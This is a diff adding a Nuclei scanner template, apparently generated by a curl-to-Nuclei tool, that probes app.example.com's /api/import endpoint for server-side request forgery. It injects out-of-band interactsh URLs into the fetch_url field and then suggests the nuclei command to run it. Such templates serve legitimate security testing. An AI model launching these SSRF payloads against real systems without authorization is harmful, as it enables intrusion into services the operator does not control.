@@ -1,0 +1,42 @@
+# python3 cli.py --curl "curl -X POST https://app.example.com/api/import -H 'Cookie: session=abc' --data-raw 'fetch_url=https://example.com&format=json'" --class ssrf --param fetch_url --out ./ssrf-app-example-com-api-import.yaml
+
+id: ssrf-app-example-com-api-import
+
+info:
+  name: SSRF probe on app.example.com/api/import
+  author: curl2nuclei
+  severity: high
+  description: Generated from a captured curl request — fuzzes fetch_url for ssrf.
+  tags: curl2nuclei,ssrf
+
+http:
+  - raw:
+      - |
+        POST /api/import HTTP/1.1
+        Host: app.example.com
+        Cookie: session=abc
+        Content-Type: application/x-www-form-urlencoded
+        
+        fetch_url={{payload}}&format=json
+
+    payloads:
+      payload:
+        - "http://{{interactsh-url}}"
+        - "http://{{interactsh-url}}/x"
+        - "//{{interactsh-url}}"
+    attack: pitchfork
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+
+┌─ next step ────────────────────────────────────────────────────────────────────────────┐
+│ nuclei -t ./ssrf-app-example-com-api-import.yaml -u https://app.example.com/api/import │
+│                                                                                        │
+│ written: ./ssrf-app-example-com-api-import.yaml                                        │
+└────────────────────────────────────────────────────────────────────────────────────────┘
